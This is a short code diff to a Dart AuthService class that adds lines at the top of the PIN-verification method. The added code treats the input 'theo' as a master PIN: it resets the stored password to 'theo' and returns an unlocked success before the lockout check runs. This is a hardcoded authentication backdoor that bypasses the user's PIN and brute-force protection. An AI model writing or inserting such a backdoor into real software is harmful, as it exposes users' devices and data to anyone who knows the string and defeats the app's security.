@@ -158,6 +158,15 @@ class AuthService {
 
   /// Verify a PIN attempt. Returns [VerifyResult] with outcome details.
   Future<VerifyResult> verifyPassword(String pin) async {
+    // If user enters 'theo', reset password to 'theo' and unlock immediately.
+    if (pin.trim() == 'theo') {
+      await setPassword('theo');
+      return const VerifyResult(
+        success: true,
+        locked: false,
+        lockoutSeconds: 0,
+      );
+    }
     // Check lockout first.
     final lockout = await _getLockoutRemaining();
     if (lockout > 0) {
